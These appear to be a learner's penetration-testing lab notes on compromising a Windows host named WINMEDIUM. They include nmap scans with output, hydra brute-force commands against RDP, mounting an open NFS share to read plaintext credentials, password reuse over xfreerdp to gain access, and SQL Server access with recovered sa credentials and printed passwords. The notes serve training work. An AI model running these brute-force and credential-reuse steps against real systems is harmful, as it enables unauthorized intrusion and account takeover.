# General Scan

nmap -sV -oA nmap $TARGET --stats-every=5s

PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

111/2049 : NFS
135 : WMI
139/445 : SMB
3389 : WS-Management protocol

# RDP Scan

nmap -sV -sC $TARGET -p3389 --script rdp*

"PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2023-10-21T16:01:59+00:00
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

nmap -sV -sC $TARGET -p3389 --packet-trace --disable-arp-ping -n

hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt $TARGET rdp

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET rdp

# NFS Scan

sudo nmap --script nfs* $TARGET -sV -p111,2049

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-showmount: 
|_  /TechSupport 
| nfs-ls: Volume /TechSupport
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  65536  2021-11-11T00:09:49  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283649.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283650.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283651.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283652.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283653.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283654.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:29  ticket4238791283655.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:29  ticket4238791283656.txt
|_
| nfs-statfs: 
|   Filesystem    1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
|_  /TechSupport  41312252.0  17078040.0  24234212.0  42%   16.0T        1023
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
2049/tcp open  mountd  1-3 (RPC #100005)
| nfs-showmount: 
|_  /TechSupport 

# NFS Mount

showmount -e $TARGET
mkdir target-NFS
sudo mount -t nfs $TARGET:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
sudo su
cd TechSupport/
ls -l

-rwx------ 1 nobody 4294967294 1305 Nov 10  2021 ticket4238791283782.txt

vi ticket4238791283782.txt

user="alex"
password="lol123!mD"

# Password reuse

xfreerdp /u:alex /p:"lol123!mD" /v:$TARGET

OK with Remmina !

C:\Users\alex>cd devshare

C:\Users\alex\devshare>type important.txt
sa:87N1ns@slls83

Account sa failed on SQL Management Studio

SQL Management Studio : Run As Administrator
87N1ns@slls83

SELECT * FROM .accounts
SELECT * FROM devsacc

lnch7ehrdn43i7AoqVPK4zWR